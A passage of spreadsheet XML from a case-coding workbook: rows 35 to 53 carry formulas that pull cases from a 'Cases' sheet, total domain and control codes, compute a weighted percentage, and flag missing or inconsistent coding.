        <f>Cases!A35</f>
        <v/>
      </c>
      <c r="B35" s="11">
        <f>Cases!B35</f>
        <v/>
      </c>
      <c r="C35" s="11">
        <f>Cases!C35</f>
        <v/>
      </c>
      <c r="D35" s="11">
        <f>IF(Cases!F35="",LEFT(Cases!G35,120),Cases!F35)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E35:L35)=0,"",SUM(E35:L35))</f>
        <v/>
      </c>
      <c r="AJ35" s="13">
        <f>IF(AI35="","",N(E35)*3+N(F35)*2+N(G35)*2+N(H35)*2+N(I35)*2+N(J35)*3+N(K35)*3+N(L35)*3)</f>
        <v/>
      </c>
      <c r="AK35" s="13">
        <f>IF(AI35="","",COUNTIF(N35:AG35,1))</f>
        <v/>
      </c>
      <c r="AL35" s="13">
        <f>IF(OR(AJ35="",AJ35=0),"",ROUND(100*(AJ35-AK35)/AJ35,1))</f>
        <v/>
      </c>
      <c r="AM35" s="11">
        <f>IF(AI35="","",IF(AI35=0,"No domain coded 1; ","")&amp;IF(M35="","Primary domain missing; ",IF(IFERROR(INDEX(E35:L35,1,M35),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N35:AG35)&lt;&gt;AJ35,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH35="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN35" s="13">
        <f>IF(AND(AI35&lt;&gt;"",AM35=""),1,0)</f>
        <v/>
      </c>
      <c r="AO35" s="14" t="n"/>
    </row>
    <row r="36">
      <c r="A36" s="11">
        <f>Cases!A36</f>
        <v/>
      </c>
      <c r="B36" s="11">
        <f>Cases!B36</f>
        <v/>
      </c>
      <c r="C36" s="11">
        <f>Cases!C36</f>
        <v/>
      </c>
      <c r="D36" s="11">
        <f>IF(Cases!F36="",LEFT(Cases!G36,120),Cases!F36)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E36:L36)=0,"",SUM(E36:L36))</f>
        <v/>
      </c>
      <c r="AJ36" s="13">
        <f>IF(AI36="","",N(E36)*3+N(F36)*2+N(G36)*2+N(H36)*2+N(I36)*2+N(J36)*3+N(K36)*3+N(L36)*3)</f>
        <v/>
      </c>
      <c r="AK36" s="13">
        <f>IF(AI36="","",COUNTIF(N36:AG36,1))</f>
        <v/>
      </c>
      <c r="AL36" s="13">
        <f>IF(OR(AJ36="",AJ36=0),"",ROUND(100*(AJ36-AK36)/AJ36,1))</f>
        <v/>
      </c>
      <c r="AM36" s="11">
        <f>IF(AI36="","",IF(AI36=0,"No domain coded 1; ","")&amp;IF(M36="","Primary domain missing; ",IF(IFERROR(INDEX(E36:L36,1,M36),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N36:AG36)&lt;&gt;AJ36,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH36="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN36" s="13">
        <f>IF(AND(AI36&lt;&gt;"",AM36=""),1,0)</f>
        <v/>
      </c>
      <c r="AO36" s="14" t="n"/>
    </row>
    <row r="37">
      <c r="A37" s="11">
        <f>Cases!A37</f>
        <v/>
      </c>
      <c r="B37" s="11">
        <f>Cases!B37</f>
        <v/>
      </c>
      <c r="C37" s="11">
        <f>Cases!C37</f>
        <v/>
      </c>
      <c r="D37" s="11">
        <f>IF(Cases!F37="",LEFT(Cases!G37,120),Cases!F37)</f>
        <v/>
      </c>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c r="AI37" s="13">
        <f>IF(COUNT(E37:L37)=0,"",SUM(E37:L37))</f>
        <v/>
      </c>
      <c r="AJ37" s="13">
        <f>IF(AI37="","",N(E37)*3+N(F37)*2+N(G37)*2+N(H37)*2+N(I37)*2+N(J37)*3+N(K37)*3+N(L37)*3)</f>
        <v/>
      </c>
      <c r="AK37" s="13">
        <f>IF(AI37="","",COUNTIF(N37:AG37,1))</f>
        <v/>
      </c>
      <c r="AL37" s="13">
        <f>IF(OR(AJ37="",AJ37=0),"",ROUND(100*(AJ37-AK37)/AJ37,1))</f>
        <v/>
      </c>
      <c r="AM37" s="11">
        <f>IF(AI37="","",IF(AI37=0,"No domain coded 1; ","")&amp;IF(M37="","Primary domain missing; ",IF(IFERROR(INDEX(E37:L37,1,M37),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N37:AG37)&lt;&gt;AJ37,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH37="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN37" s="13">
        <f>IF(AND(AI37&lt;&gt;"",AM37=""),1,0)</f>
        <v/>
      </c>
      <c r="AO37" s="14" t="n"/>
    </row>
    <row r="38">
      <c r="A38" s="11">
        <f>Cases!A38</f>
        <v/>
      </c>
      <c r="B38" s="11">
        <f>Cases!B38</f>
        <v/>
      </c>
      <c r="C38" s="11">
        <f>Cases!C38</f>
        <v/>
      </c>
      <c r="D38" s="11">
        <f>IF(Cases!F38="",LEFT(Cases!G38,120),Cases!F38)</f>
        <v/>
      </c>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c r="AH38" s="12" t="n"/>
      <c r="AI38" s="13">
        <f>IF(COUNT(E38:L38)=0,"",SUM(E38:L38))</f>
        <v/>
      </c>
      <c r="AJ38" s="13">
        <f>IF(AI38="","",N(E38)*3+N(F38)*2+N(G38)*2+N(H38)*2+N(I38)*2+N(J38)*3+N(K38)*3+N(L38)*3)</f>
        <v/>
      </c>
      <c r="AK38" s="13">
        <f>IF(AI38="","",COUNTIF(N38:AG38,1))</f>
        <v/>
      </c>
      <c r="AL38" s="13">
        <f>IF(OR(AJ38="",AJ38=0),"",ROUND(100*(AJ38-AK38)/AJ38,1))</f>
        <v/>
      </c>
      <c r="AM38" s="11">
        <f>IF(AI38="","",IF(AI38=0,"No domain coded 1; ","")&amp;IF(M38="","Primary domain missing; ",IF(IFERROR(INDEX(E38:L38,1,M38),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N38:AG38)&lt;&gt;AJ38,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH38="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN38" s="13">
        <f>IF(AND(AI38&lt;&gt;"",AM38=""),1,0)</f>
        <v/>
      </c>
      <c r="AO38" s="14" t="n"/>
    </row>
    <row r="39">
      <c r="A39" s="11">
        <f>Cases!A39</f>
        <v/>
      </c>
      <c r="B39" s="11">
        <f>Cases!B39</f>
        <v/>
      </c>
      <c r="C39" s="11">
        <f>Cases!C39</f>
        <v/>
      </c>
      <c r="D39" s="11">
        <f>IF(Cases!F39="",LEFT(Cases!G39,120),Cases!F39)</f>
        <v/>
      </c>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c r="AI39" s="13">
        <f>IF(COUNT(E39:L39)=0,"",SUM(E39:L39))</f>
        <v/>
      </c>
      <c r="AJ39" s="13">
        <f>IF(AI39="","",N(E39)*3+N(F39)*2+N(G39)*2+N(H39)*2+N(I39)*2+N(J39)*3+N(K39)*3+N(L39)*3)</f>
        <v/>
      </c>
      <c r="AK39" s="13">
        <f>IF(AI39="","",COUNTIF(N39:AG39,1))</f>
        <v/>
      </c>
      <c r="AL39" s="13">
        <f>IF(OR(AJ39="",AJ39=0),"",ROUND(100*(AJ39-AK39)/AJ39,1))</f>
        <v/>
      </c>
      <c r="AM39" s="11">
        <f>IF(AI39="","",IF(AI39=0,"No domain coded 1; ","")&amp;IF(M39="","Primary domain missing; ",IF(IFERROR(INDEX(E39:L39,1,M39),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N39:AG39)&lt;&gt;AJ39,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH39="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN39" s="13">
        <f>IF(AND(AI39&lt;&gt;"",AM39=""),1,0)</f>
        <v/>
      </c>
      <c r="AO39" s="14" t="n"/>
    </row>
    <row r="40">
      <c r="A40" s="11">
        <f>Cases!A40</f>
        <v/>
      </c>
      <c r="B40" s="11">
        <f>Cases!B40</f>
        <v/>
      </c>
      <c r="C40" s="11">
        <f>Cases!C40</f>
        <v/>
      </c>
      <c r="D40" s="11">
        <f>IF(Cases!F40="",LEFT(Cases!G40,120),Cases!F40)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E40:L40)=0,"",SUM(E40:L40))</f>
        <v/>
      </c>
      <c r="AJ40" s="13">
        <f>IF(AI40="","",N(E40)*3+N(F40)*2+N(G40)*2+N(H40)*2+N(I40)*2+N(J40)*3+N(K40)*3+N(L40)*3)</f>
        <v/>
      </c>
      <c r="AK40" s="13">
        <f>IF(AI40="","",COUNTIF(N40:AG40,1))</f>
        <v/>
      </c>
      <c r="AL40" s="13">
        <f>IF(OR(AJ40="",AJ40=0),"",ROUND(100*(AJ40-AK40)/AJ40,1))</f>
        <v/>
      </c>
      <c r="AM40" s="11">
        <f>IF(AI40="","",IF(AI40=0,"No domain coded 1; ","")&amp;IF(M40="","Primary domain missing; ",IF(IFERROR(INDEX(E40:L40,1,M40),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N40:AG40)&lt;&gt;AJ40,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH40="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN40" s="13">
        <f>IF(AND(AI40&lt;&gt;"",AM40=""),1,0)</f>
        <v/>
      </c>
      <c r="AO40" s="14" t="n"/>
    </row>
    <row r="41">
      <c r="A41" s="11">
        <f>Cases!A41</f>
        <v/>
      </c>
      <c r="B41" s="11">
        <f>Cases!B41</f>
        <v/>
      </c>
      <c r="C41" s="11">
        <f>Cases!C41</f>
        <v/>
      </c>
      <c r="D41" s="11">
        <f>IF(Cases!F41="",LEFT(Cases!G41,120),Cases!F41)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E41:L41)=0,"",SUM(E41:L41))</f>
        <v/>
      </c>
      <c r="AJ41" s="13">
        <f>IF(AI41="","",N(E41)*3+N(F41)*2+N(G41)*2+N(H41)*2+N(I41)*2+N(J41)*3+N(K41)*3+N(L41)*3)</f>
        <v/>
      </c>
      <c r="AK41" s="13">
        <f>IF(AI41="","",COUNTIF(N41:AG41,1))</f>
        <v/>
      </c>
      <c r="AL41" s="13">
        <f>IF(OR(AJ41="",AJ41=0),"",ROUND(100*(AJ41-AK41)/AJ41,1))</f>
        <v/>
      </c>
      <c r="AM41" s="11">
        <f>IF(AI41="","",IF(AI41=0,"No domain coded 1; ","")&amp;IF(M41="","Primary domain missing; ",IF(IFERROR(INDEX(E41:L41,1,M41),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N41:AG41)&lt;&gt;AJ41,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH41="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN41" s="13">
        <f>IF(AND(AI41&lt;&gt;"",AM41=""),1,0)</f>
        <v/>
      </c>
      <c r="AO41" s="14" t="n"/>
    </row>
    <row r="42">
      <c r="A42" s="11">
        <f>Cases!A42</f>
        <v/>
      </c>
      <c r="B42" s="11">
        <f>Cases!B42</f>
        <v/>
      </c>
      <c r="C42" s="11">
        <f>Cases!C42</f>
        <v/>
      </c>
      <c r="D42" s="11">
        <f>IF(Cases!F42="",LEFT(Cases!G42,120),Cases!F42)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E42:L42)=0,"",SUM(E42:L42))</f>
        <v/>
      </c>
      <c r="AJ42" s="13">
        <f>IF(AI42="","",N(E42)*3+N(F42)*2+N(G42)*2+N(H42)*2+N(I42)*2+N(J42)*3+N(K42)*3+N(L42)*3)</f>
        <v/>
      </c>
      <c r="AK42" s="13">
        <f>IF(AI42="","",COUNTIF(N42:AG42,1))</f>
        <v/>
      </c>
      <c r="AL42" s="13">
        <f>IF(OR(AJ42="",AJ42=0),"",ROUND(100*(AJ42-AK42)/AJ42,1))</f>
        <v/>
      </c>
      <c r="AM42" s="11">
        <f>IF(AI42="","",IF(AI42=0,"No domain coded 1; ","")&amp;IF(M42="","Primary domain missing; ",IF(IFERROR(INDEX(E42:L42,1,M42),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N42:AG42)&lt;&gt;AJ42,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH42="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN42" s="13">
        <f>IF(AND(AI42&lt;&gt;"",AM42=""),1,0)</f>
        <v/>
      </c>
      <c r="AO42" s="14" t="n"/>
    </row>
    <row r="43">
      <c r="A43" s="11">
        <f>Cases!A43</f>
        <v/>
      </c>
      <c r="B43" s="11">
        <f>Cases!B43</f>
        <v/>
      </c>
      <c r="C43" s="11">
        <f>Cases!C43</f>
        <v/>
      </c>
      <c r="D43" s="11">
        <f>IF(Cases!F43="",LEFT(Cases!G43,120),Cases!F43)</f>
        <v/>
      </c>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c r="AI43" s="13">
        <f>IF(COUNT(E43:L43)=0,"",SUM(E43:L43))</f>
        <v/>
      </c>
      <c r="AJ43" s="13">
        <f>IF(AI43="","",N(E43)*3+N(F43)*2+N(G43)*2+N(H43)*2+N(I43)*2+N(J43)*3+N(K43)*3+N(L43)*3)</f>
        <v/>
      </c>
      <c r="AK43" s="13">
        <f>IF(AI43="","",COUNTIF(N43:AG43,1))</f>
        <v/>
      </c>
      <c r="AL43" s="13">
        <f>IF(OR(AJ43="",AJ43=0),"",ROUND(100*(AJ43-AK43)/AJ43,1))</f>
        <v/>
      </c>
      <c r="AM43" s="11">
        <f>IF(AI43="","",IF(AI43=0,"No domain coded 1; ","")&amp;IF(M43="","Primary domain missing; ",IF(IFERROR(INDEX(E43:L43,1,M43),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N43:AG43)&lt;&gt;AJ43,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH43="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN43" s="13">
        <f>IF(AND(AI43&lt;&gt;"",AM43=""),1,0)</f>
        <v/>
      </c>
      <c r="AO43" s="14" t="n"/>
    </row>
    <row r="44">
      <c r="A44" s="11">
        <f>Cases!A44</f>
        <v/>
      </c>
      <c r="B44" s="11">
        <f>Cases!B44</f>
        <v/>
      </c>
      <c r="C44" s="11">
        <f>Cases!C44</f>
        <v/>
      </c>
      <c r="D44" s="11">
        <f>IF(Cases!F44="",LEFT(Cases!G44,120),Cases!F44)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E44:L44)=0,"",SUM(E44:L44))</f>
        <v/>
      </c>
      <c r="AJ44" s="13">
        <f>IF(AI44="","",N(E44)*3+N(F44)*2+N(G44)*2+N(H44)*2+N(I44)*2+N(J44)*3+N(K44)*3+N(L44)*3)</f>
        <v/>
      </c>
      <c r="AK44" s="13">
        <f>IF(AI44="","",COUNTIF(N44:AG44,1))</f>
        <v/>
      </c>
      <c r="AL44" s="13">
        <f>IF(OR(AJ44="",AJ44=0),"",ROUND(100*(AJ44-AK44)/AJ44,1))</f>
        <v/>
      </c>
      <c r="AM44" s="11">
        <f>IF(AI44="","",IF(AI44=0,"No domain coded 1; ","")&amp;IF(M44="","Primary domain missing; ",IF(IFERROR(INDEX(E44:L44,1,M44),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N44:AG44)&lt;&gt;AJ44,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH44="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN44" s="13">
        <f>IF(AND(AI44&lt;&gt;"",AM44=""),1,0)</f>
        <v/>
      </c>
      <c r="AO44" s="14" t="n"/>
    </row>
    <row r="45">
      <c r="A45" s="11">
        <f>Cases!A45</f>
        <v/>
      </c>
      <c r="B45" s="11">
        <f>Cases!B45</f>
        <v/>
      </c>
      <c r="C45" s="11">
        <f>Cases!C45</f>
        <v/>
      </c>
      <c r="D45" s="11">
        <f>IF(Cases!F45="",LEFT(Cases!G45,120),Cases!F45)</f>
        <v/>
      </c>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c r="AI45" s="13">
        <f>IF(COUNT(E45:L45)=0,"",SUM(E45:L45))</f>
        <v/>
      </c>
      <c r="AJ45" s="13">
        <f>IF(AI45="","",N(E45)*3+N(F45)*2+N(G45)*2+N(H45)*2+N(I45)*2+N(J45)*3+N(K45)*3+N(L45)*3)</f>
        <v/>
      </c>
      <c r="AK45" s="13">
        <f>IF(AI45="","",COUNTIF(N45:AG45,1))</f>
        <v/>
      </c>
      <c r="AL45" s="13">
        <f>IF(OR(AJ45="",AJ45=0),"",ROUND(100*(AJ45-AK45)/AJ45,1))</f>
        <v/>
      </c>
      <c r="AM45" s="11">
        <f>IF(AI45="","",IF(AI45=0,"No domain coded 1; ","")&amp;IF(M45="","Primary domain missing; ",IF(IFERROR(INDEX(E45:L45,1,M45),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N45:AG45)&lt;&gt;AJ45,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH45="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN45" s="13">
        <f>IF(AND(AI45&lt;&gt;"",AM45=""),1,0)</f>
        <v/>
      </c>
      <c r="AO45" s="14" t="n"/>
    </row>
    <row r="46">
      <c r="A46" s="11">
        <f>Cases!A46</f>
        <v/>
      </c>
      <c r="B46" s="11">
        <f>Cases!B46</f>
        <v/>
      </c>
      <c r="C46" s="11">
        <f>Cases!C46</f>
        <v/>
      </c>
      <c r="D46" s="11">
        <f>IF(Cases!F46="",LEFT(Cases!G46,120),Cases!F46)</f>
        <v/>
      </c>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c r="AI46" s="13">
        <f>IF(COUNT(E46:L46)=0,"",SUM(E46:L46))</f>
        <v/>
      </c>
      <c r="AJ46" s="13">
        <f>IF(AI46="","",N(E46)*3+N(F46)*2+N(G46)*2+N(H46)*2+N(I46)*2+N(J46)*3+N(K46)*3+N(L46)*3)</f>
        <v/>
      </c>
      <c r="AK46" s="13">
        <f>IF(AI46="","",COUNTIF(N46:AG46,1))</f>
        <v/>
      </c>
      <c r="AL46" s="13">
        <f>IF(OR(AJ46="",AJ46=0),"",ROUND(100*(AJ46-AK46)/AJ46,1))</f>
        <v/>
      </c>
      <c r="AM46" s="11">
        <f>IF(AI46="","",IF(AI46=0,"No domain coded 1; ","")&amp;IF(M46="","Primary domain missing; ",IF(IFERROR(INDEX(E46:L46,1,M46),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N46:AG46)&lt;&gt;AJ46,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH46="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN46" s="13">
        <f>IF(AND(AI46&lt;&gt;"",AM46=""),1,0)</f>
        <v/>
      </c>
      <c r="AO46" s="14" t="n"/>
    </row>
    <row r="47">
      <c r="A47" s="11">
        <f>Cases!A47</f>
        <v/>
      </c>
      <c r="B47" s="11">
        <f>Cases!B47</f>
        <v/>
      </c>
      <c r="C47" s="11">
        <f>Cases!C47</f>
        <v/>
      </c>
      <c r="D47" s="11">
        <f>IF(Cases!F47="",LEFT(Cases!G47,120),Cases!F47)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E47:L47)=0,"",SUM(E47:L47))</f>
        <v/>
      </c>
      <c r="AJ47" s="13">
        <f>IF(AI47="","",N(E47)*3+N(F47)*2+N(G47)*2+N(H47)*2+N(I47)*2+N(J47)*3+N(K47)*3+N(L47)*3)</f>
        <v/>
      </c>
      <c r="AK47" s="13">
        <f>IF(AI47="","",COUNTIF(N47:AG47,1))</f>
        <v/>
      </c>
      <c r="AL47" s="13">
        <f>IF(OR(AJ47="",AJ47=0),"",ROUND(100*(AJ47-AK47)/AJ47,1))</f>
        <v/>
      </c>
      <c r="AM47" s="11">
        <f>IF(AI47="","",IF(AI47=0,"No domain coded 1; ","")&amp;IF(M47="","Primary domain missing; ",IF(IFERROR(INDEX(E47:L47,1,M47),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N47:AG47)&lt;&gt;AJ47,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH47="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN47" s="13">
        <f>IF(AND(AI47&lt;&gt;"",AM47=""),1,0)</f>
        <v/>
      </c>
      <c r="AO47" s="14" t="n"/>
    </row>
    <row r="48">
      <c r="A48" s="11">
        <f>Cases!A48</f>
        <v/>
      </c>
      <c r="B48" s="11">
        <f>Cases!B48</f>
        <v/>
      </c>
      <c r="C48" s="11">
        <f>Cases!C48</f>
        <v/>
      </c>
      <c r="D48" s="11">
        <f>IF(Cases!F48="",LEFT(Cases!G48,120),Cases!F48)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E48:L48)=0,"",SUM(E48:L48))</f>
        <v/>
      </c>
      <c r="AJ48" s="13">
        <f>IF(AI48="","",N(E48)*3+N(F48)*2+N(G48)*2+N(H48)*2+N(I48)*2+N(J48)*3+N(K48)*3+N(L48)*3)</f>
        <v/>
      </c>
      <c r="AK48" s="13">
        <f>IF(AI48="","",COUNTIF(N48:AG48,1))</f>
        <v/>
      </c>
      <c r="AL48" s="13">
        <f>IF(OR(AJ48="",AJ48=0),"",ROUND(100*(AJ48-AK48)/AJ48,1))</f>
        <v/>
      </c>
      <c r="AM48" s="11">
        <f>IF(AI48="","",IF(AI48=0,"No domain coded 1; ","")&amp;IF(M48="","Primary domain missing; ",IF(IFERROR(INDEX(E48:L48,1,M48),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N48:AG48)&lt;&gt;AJ48,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH48="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN48" s="13">
        <f>IF(AND(AI48&lt;&gt;"",AM48=""),1,0)</f>
        <v/>
      </c>
      <c r="AO48" s="14" t="n"/>
    </row>
    <row r="49">
      <c r="A49" s="11">
        <f>Cases!A49</f>
        <v/>
      </c>
      <c r="B49" s="11">
        <f>Cases!B49</f>
        <v/>
      </c>
      <c r="C49" s="11">
        <f>Cases!C49</f>
        <v/>
      </c>
      <c r="D49" s="11">
        <f>IF(Cases!F49="",LEFT(Cases!G49,120),Cases!F49)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E49:L49)=0,"",SUM(E49:L49))</f>
        <v/>
      </c>
      <c r="AJ49" s="13">
        <f>IF(AI49="","",N(E49)*3+N(F49)*2+N(G49)*2+N(H49)*2+N(I49)*2+N(J49)*3+N(K49)*3+N(L49)*3)</f>
        <v/>
      </c>
      <c r="AK49" s="13">
        <f>IF(AI49="","",COUNTIF(N49:AG49,1))</f>
        <v/>
      </c>
      <c r="AL49" s="13">
        <f>IF(OR(AJ49="",AJ49=0),"",ROUND(100*(AJ49-AK49)/AJ49,1))</f>
        <v/>
      </c>
      <c r="AM49" s="11">
        <f>IF(AI49="","",IF(AI49=0,"No domain coded 1; ","")&amp;IF(M49="","Primary domain missing; ",IF(IFERROR(INDEX(E49:L49,1,M49),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N49:AG49)&lt;&gt;AJ49,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH49="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN49" s="13">
        <f>IF(AND(AI49&lt;&gt;"",AM49=""),1,0)</f>
        <v/>
      </c>
      <c r="AO49" s="14" t="n"/>
    </row>
    <row r="50">
      <c r="A50" s="11">
        <f>Cases!A50</f>
        <v/>
      </c>
      <c r="B50" s="11">
        <f>Cases!B50</f>
        <v/>
      </c>
      <c r="C50" s="11">
        <f>Cases!C50</f>
        <v/>
      </c>
      <c r="D50" s="11">
        <f>IF(Cases!F50="",LEFT(Cases!G50,120),Cases!F50)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E50:L50)=0,"",SUM(E50:L50))</f>
        <v/>
      </c>
      <c r="AJ50" s="13">
        <f>IF(AI50="","",N(E50)*3+N(F50)*2+N(G50)*2+N(H50)*2+N(I50)*2+N(J50)*3+N(K50)*3+N(L50)*3)</f>
        <v/>
      </c>
      <c r="AK50" s="13">
        <f>IF(AI50="","",COUNTIF(N50:AG50,1))</f>
        <v/>
      </c>
      <c r="AL50" s="13">
        <f>IF(OR(AJ50="",AJ50=0),"",ROUND(100*(AJ50-AK50)/AJ50,1))</f>
        <v/>
      </c>
      <c r="AM50" s="11">
        <f>IF(AI50="","",IF(AI50=0,"No domain coded 1; ","")&amp;IF(M50="","Primary domain missing; ",IF(IFERROR(INDEX(E50:L50,1,M50),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N50:AG50)&lt;&gt;AJ50,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH50="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN50" s="13">
        <f>IF(AND(AI50&lt;&gt;"",AM50=""),1,0)</f>
        <v/>
      </c>
      <c r="AO50" s="14" t="n"/>
    </row>
    <row r="51">
      <c r="A51" s="11">
        <f>Cases!A51</f>
        <v/>
      </c>
      <c r="B51" s="11">
        <f>Cases!B51</f>
        <v/>
      </c>
      <c r="C51" s="11">
        <f>Cases!C51</f>
        <v/>
      </c>
      <c r="D51" s="11">
        <f>IF(Cases!F51="",LEFT(Cases!G51,120),Cases!F51)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E51:L51)=0,"",SUM(E51:L51))</f>
        <v/>
      </c>
      <c r="AJ51" s="13">
        <f>IF(AI51="","",N(E51)*3+N(F51)*2+N(G51)*2+N(H51)*2+N(I51)*2+N(J51)*3+N(K51)*3+N(L51)*3)</f>
        <v/>
      </c>
      <c r="AK51" s="13">
        <f>IF(AI51="","",COUNTIF(N51:AG51,1))</f>
        <v/>
      </c>
      <c r="AL51" s="13">
        <f>IF(OR(AJ51="",AJ51=0),"",ROUND(100*(AJ51-AK51)/AJ51,1))</f>
        <v/>
      </c>
      <c r="AM51" s="11">
        <f>IF(AI51="","",IF(AI51=0,"No domain coded 1; ","")&amp;IF(M51="","Primary domain missing; ",IF(IFERROR(INDEX(E51:L51,1,M51),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N51:AG51)&lt;&gt;AJ51,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH51="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN51" s="13">
        <f>IF(AND(AI51&lt;&gt;"",AM51=""),1,0)</f>
        <v/>
      </c>
      <c r="AO51" s="14" t="n"/>
    </row>
    <row r="52">
      <c r="A52" s="11">
        <f>Cases!A52</f>
        <v/>
      </c>
      <c r="B52" s="11">
        <f>Cases!B52</f>
        <v/>
      </c>
      <c r="C52" s="11">
        <f>Cases!C52</f>
        <v/>
      </c>
      <c r="D52" s="11">
        <f>IF(Cases!F52="",LEFT(Cases!G52,120),Cases!F52)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E52:L52)=0,"",SUM(E52:L52))</f>
        <v/>
      </c>
      <c r="AJ52" s="13">
        <f>IF(AI52="","",N(E52)*3+N(F52)*2+N(G52)*2+N(H52)*2+N(I52)*2+N(J52)*3+N(K52)*3+N(L52)*3)</f>
        <v/>
      </c>
      <c r="AK52" s="13">
        <f>IF(AI52="","",COUNTIF(N52:AG52,1))</f>
        <v/>
      </c>
      <c r="AL52" s="13">
        <f>IF(OR(AJ52="",AJ52=0),"",ROUND(100*(AJ52-AK52)/AJ52,1))</f>
        <v/>
      </c>
      <c r="AM52" s="11">
        <f>IF(AI52="","",IF(AI52=0,"No domain coded 1; ","")&amp;IF(M52="","Primary domain missing; ",IF(IFERROR(INDEX(E52:L52,1,M52),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N52:AG52)&lt;&gt;AJ52,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH52="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN52" s="13">
        <f>IF(AND(AI52&lt;&gt;"",AM52=""),1,0)</f>
        <v/>
      </c>
      <c r="AO52" s="14" t="n"/>
    </row>
    <row r="53">
      <c r="A53" s="11">
        <f>Cases!A53</f>
        <v/>
      </c>
      <c r="B53" s="11">
        <f>Cases!B53</f>
        <v/>
      </c>
      <c r="C53" s="11">
        <f>Cases!C53</f>
        <v/>
      </c>
      <c r="D53" s="11">
        <f>IF(Cases!F53="",LEFT(Cases!G53,120),Cases!F53)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E53:L53)=0,"",SUM(E53:L53))</f>
        <v/>
      </c>
      <c r="AJ53" s="13">
        <f>IF(AI53="","",N(E53)*3+N(F53)*2+N(G53)*2+N(H53)*2+N(I53)*2+N(J53)*3+N(K53)*3+N(L53)*3)</f>
        <v/>
      </c>
      <c r="AK53" s="13">
        <f>IF(AI53="","",COUNTIF(N53:AG53,1))</f>
        <v/>
      </c>
      <c r="AL53" s="13">
        <f>IF(OR(AJ53="",AJ53=0),"",ROUND(100*(AJ53-AK53)/AJ53,1))</f>
        <v/>
      </c>
      <c r="AM53" s="11">
